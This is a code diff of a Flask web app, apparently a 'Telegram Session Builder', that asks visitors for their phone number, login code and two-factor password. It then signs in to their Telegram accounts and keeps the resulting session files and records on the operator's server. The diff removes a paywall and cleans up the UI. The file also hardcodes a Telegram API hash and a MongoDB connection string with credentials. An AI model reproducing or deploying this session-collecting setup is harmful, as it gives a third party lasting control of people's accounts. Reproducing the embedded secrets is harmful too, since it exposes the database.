@@ -1,5 +1,5 @@
 # ================================================================
-# Telegram Session Builder – FULL FINAL VERSION (FIXED UI/ADMIN)
+# Telegram Session Builder – FULL FINAL VERSION (UI + ADMIN)
 # By: Tiam
 # ================================================================
 
@@ -12,8 +12,7 @@ from pymongo import MongoClient
 import requests
 
 # ===================== CONFIG ===================================
-
-self_config = {
+CONFIG = {
     "api_id": 24645053,
     "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
     "admin_username": "tiam",
@@ -23,10 +22,9 @@ self_config = {
     "device_name": "⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙"
 }
 
-os.makedirs(self_config["save_path"], exist_ok=True)
+os.makedirs(CONFIG["save_path"], exist_ok=True)
 
 # ===================== MongoDB ==================================
-
 mongo = MongoClient(
     "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
     "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
@@ -38,24 +36,19 @@ mongo = MongoClient(
 db = mongo.telegram_sessions
 sessions_col = db.sessions
 links_col = db.links
-payments_col = db.payments
 
 # ===================== Flask ====================================
-
 app = Flask(__name__, static_folder="static")
 
 # ===================== Async Loop ================================
-
 loop = asyncio.new_event_loop()
-threading.Thread(
-    target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()),
-    daemon=True
-).start()
+threading.Thread(target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()), daemon=True).start()
 
 def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, loop).result()
 
 # ===================== Utils ====================================
+clients = {}
 
 def gen_token():
     return secrets.token_urlsafe(8)
@@ -79,16 +72,12 @@ def normalize_phone(phone):
     return phone
 
 def delete_session(phone):
-    path = os.path.join(self_config["save_path"], phone)
+    path = os.path.join(CONFIG["save_path"], phone)
     if os.path.exists(path):
         shutil.rmtree(path)
     sessions_col.delete_one({"phone": phone})
 
-def has_paid(phone):
-    return payments_col.find_one({"phone": phone, "paid": True}) is not None
-
 # ===================== HTML USER PANEL ===========================
-
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="fa">
@@ -105,7 +94,7 @@ body{
     color:white;
 }
 .box{
-    width:320px;
+    width:350px;
     margin:80px auto;
     padding:22px;
     background:rgba(15,23,42,0.88);
@@ -114,7 +103,7 @@ body{
 }
 input,button{
     width:100%;
-    padding:9px;
+    padding:10px;
     margin-top:10px;
     border-radius:10px;
     border:none;
@@ -125,24 +114,21 @@ button{
     background:#6366f1;
     color:white;
     cursor:pointer;
+    transition:0.2s;
 }
-#done,#paywall{display:none}
+button:active{
+    transform:scale(0.97);
+}
+#done{display:none;margin-top:10px;}
 </style>
 </head>
 <body>
 
 <div class="box">
 <h3>ساخت سشن تلگرام</h3>
-
 <input id="mainInput" placeholder="+98xxxxxxxxxx">
 <button id="mainBtn" onclick="nextStep()">دریافت کد</button>
-
 <div id="done"><h3>✅ سشن ساخته شد</h3></div>
-
-<div id="paywall">
-<h3>💰 بخش پولی</h3>
-<button onclick="payNow()">پرداخت و فعال‌سازی</button>
-</div>
 </div>
 
 <script>
@@ -160,18 +146,15 @@ function nextStep(){
                 if(confirm("سشن قبلی حذف شود؟")){
                     fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})});
                 }
-            }else{
-                fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-                .then(()=>{
-                    step="code";
-                    mainInput.placeholder="کد تأیید تلگرام";
-                    mainBtn.innerText="تأیید کد";
-                });
             }
+            fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+            .then(()=>{
+                step="code";
+                mainInput.placeholder="کد تأیید تلگرام";
+                mainBtn.innerText="تأیید کد";
+            });
         });
-    }
-
-    else if(step==="code"){
+    } else if(step==="code"){
         fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:v})})
         .then(r=>r.json()).then(d=>{
             if(d.status==="2fa"){
@@ -182,9 +165,7 @@ function nextStep(){
             }else if(d.status==="ok"){finish();}
             else alert("کد اشتباه است");
         });
-    }
-
-    else if(step==="password"){
+    } else if(step==="password"){
         fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:v})})
         .then(()=>finish());
     }
@@ -193,14 +174,7 @@ function nextStep(){
 function finish(){
     mainInput.style.display="none";
     mainBtn.style.display="none";
-    done.style.display="block";
-    fetch("/check_payment",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-    .then(r=>r.json()).then(d=>{if(!d.paid)paywall.style.display="block";});
-}
-
-function payNow(){
-    fetch("/pay",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-    .then(()=>paywall.style.display="none");
+    document.getElementById("done").style.display="block";
 }
 
 setInterval(()=>fetch("/ping"),240000);
@@ -210,7 +184,6 @@ setInterval(()=>fetch("/ping"),240000);
 """
 
 # ===================== ADMIN PANEL ==============================
-
 ADMIN_HTML = """
 <!DOCTYPE html>
 <html lang="fa">
@@ -221,7 +194,8 @@ ADMIN_HTML = """
 body{background:#111;color:white;font-family:tahoma}
 table{width:80%;margin:20px auto;border-collapse:collapse}
 th,td{border:1px solid #555;padding:8px;text-align:center}
-button{padding:6px 10px}
+button{padding:6px 10px;cursor:pointer;transition:0.2s;}
+button:active{transform:scale(0.97);}
 </style>
 </head>
 <body>
@@ -250,12 +224,12 @@ button{padding:6px 10px}
 
 <script>
 function copyLink(t){
-    navigator.clipboard.writeText("{{ self_config.base_url }}/?key="+t)
-    alert("لینک کپی شد")
+    navigator.clipboard.writeText("{{ CONFIG.base_url }}/?key="+t);
+    alert("لینک کپی شد");
 }
 function del(t){
     fetch("/admin/delete_link",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:t})})
-    .then(()=>location.reload())
+    .then(()=>location.reload());
 }
 </script>
 
@@ -264,7 +238,6 @@ function del(t){
 """
 
 # ===================== ROUTES ===================================
-
 @app.route("/")
 def home():
     key = request.args.get("key")
@@ -286,21 +259,8 @@ def del_sess():
     delete_session(normalize_phone(request.json["phone"]))
     return jsonify(ok=True)
 
-@app.route("/check_payment", methods=["POST"])
-def chk_pay():
-    return jsonify(paid=has_paid(normalize_phone(request.json["phone"])))
-
-@app.route("/pay", methods=["POST"])
-def pay():
-    payments_col.update_one({"phone": normalize_phone(request.json["phone"])},{"$set":{"paid":True}},upsert=True)
-    return jsonify(ok=True)
-
-clients = {}
-
 async def create_client(phone):
-    c = TelegramClient(os.path.join(self_config["save_path"], phone),
-                       self_config["api_id"], self_config["api_hash"],
-                       device_model=self_config["device_name"])
+    c = TelegramClient(os.path.join(CONFIG["save_path"], phone), CONFIG["api_id"], CONFIG["api_hash"], device_model=CONFIG["device_name"])
     await c.connect()
     return c
 
@@ -327,7 +287,7 @@ def send_code():
         return jsonify(status="error")
 
 @app.route("/send_password", methods=["POST"])
-def send_pass():
+def send_password():
     phone = normalize_phone(request.json["phone"])
     run_async(clients[phone].sign_in(password=request.json["password"]))
     sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
@@ -336,29 +296,27 @@ def send_pass():
 @app.route("/admin", methods=["GET","POST"])
 def admin():
     a = request.authorization
-    if not a or a.username!=self_config["admin_username"] or a.password!=self_config["admin_password"]:
-        return ("Unauthorized",401,{"WWW-Authenticate":"Basic"})
-    if request.method=="POST":
-        links_col.insert_one({"token":gen_token(),"max":int(request.form["max"]),"used":0})
+    if not a or a.username != CONFIG["admin_username"] or a.password != CONFIG["admin_password"]:
+        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
+    if request.method == "POST":
+        links_col.insert_one({"token": gen_token(), "max": int(request.form["max"]), "used": 0})
         return redirect("/admin")
-    return render_template_string(ADMIN_HTML,links=list(links_col.find()),self_config=self_config)
+    return render_template_string(ADMIN_HTML, links=list(links_col.find()), CONFIG=CONFIG)
 
 @app.route("/admin/delete_link", methods=["POST"])
 def del_link():
-    links_col.delete_one({"token":request.json["token"]})
+    links_col.delete_one({"token": request.json["token"]})
     return jsonify(ok=True)
 
 # ===================== KEEP ALIVE ================================
-
 def keep_alive():
     while True:
-        try: requests.get(self_config["base_url"]+"/ping",timeout=10)
+        try: requests.get(CONFIG["base_url"] + "/ping", timeout=10)
         except: pass
         time.sleep(240)
 
-threading.Thread(target=keep_alive,daemon=True).start()
+threading.Thread(target=keep_alive, daemon=True).start()
 
-# ===================== RUN ======================================
-
+# ===================== RUN =======================================
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
